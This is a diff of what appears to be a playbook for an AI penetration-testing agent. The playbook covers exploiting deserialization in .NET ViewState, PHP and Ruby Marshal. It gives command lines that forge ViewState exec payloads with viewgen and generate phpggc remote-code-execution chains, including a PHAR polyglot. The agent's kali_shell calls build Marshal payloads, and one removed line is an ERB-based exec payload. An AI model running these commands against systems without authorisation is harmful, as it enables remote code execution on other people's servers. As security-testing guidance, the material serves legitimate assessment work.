@@ -793,16 +793,24 @@ URL-encoding of `+`, `=`, `/`).
 
 ### .NET deserialization
 
-`ysoserial.net` is NOT preinstalled. If `KALI_INSTALL_ENABLED`=True, request install
-via the kali install flow. Otherwise, hand-craft via `execute_code` (PowerShell
-gadget generation in pwsh) or skip in favor of another primitive.
+ViewState: `viewgen` IS preinstalled. Decode with `viewgen --decode`, and when the
+`__VIEWSTATE` is unprotected or you have the machineKey (leaked / default / from a
+`web.config`), forge an exec payload:
+`viewgen --webconfig web.config -m MODIFIER -c "COMMAND"`. A MAC'd/encrypted
+ViewState with an UNKNOWN key is a cryptographic problem, not a deserializer you
+can reach.
 
-`__VIEWSTATE` without MAC -> use ysoserial.net `TextFormattingRunProperties` gadget.
+Non-ViewState BinaryFormatter: `ysoserial.net` is NOT preinstalled. If
+`KALI_INSTALL_ENABLED`=True, request install via the kali install flow. Otherwise
+hand-craft via `execute_code`, or report the confirmed sink and move to another primitive.
 
-### PHP deserialization (manual; phpggc not preinstalled)
+### PHP deserialization (phpggc for framework chains; manual for app-own gadgets)
 
-Hand-craft a payload using `execute_code` (Python harness). Look up the target
-framework's gadget chain (laravel, symfony, magento, wordpress, joomla, drupal):
+`phpggc` IS preinstalled. For a known framework, generate the chain directly:
+`phpggc -l` lists them, `phpggc Laravel/RCE9 system id` emits a raw chain, and
+`phpggc -p phar -pj /tmp/poly.jpg -o /tmp/x.phar Monolog/RCE1 system id` builds a
+PHAR polyglot. When no framework gadget fits, hand-craft against the app's OWN
+class using `execute_code` (Python harness):
 
 ```python
 # example placeholder; replace with the framework-specific gadget chain
@@ -874,11 +882,17 @@ print(payload)
 
 ### Ruby Marshal
 
+`ruby` is preinstalled. Only when `Marshal.load` is reachable from user input.
+
 ```
-kali_shell({"command": "ruby -rerb -e 'puts [Marshal.dump(ERB.new(\\"<%=`id`%>\\"))].pack(\\"m0\\")'"})
+# Rails session cookie: Marshal a session Hash (works on any Ruby), then HMAC-sign with secret_key_base
+kali_shell({"command": "ruby -e 'require \\"base64\\"; puts Base64.strict_encode64(Marshal.dump({\\"user_id\\"=>1}))'"})
 ```
 
-Less common; only when `Marshal.load` is reachable from user input.
+For a `Marshal.load`-to-RCE sink, build a version-appropriate universal gadget
+object-graph (the pure-Ruby chain for the target's Ruby version). Do NOT
+`Marshal.dump(ERB.new(...))` -- modern Ruby refuses to marshal an ERB object
+("singleton class can't be dumped").
 
 ### Cross-format detection probe
 
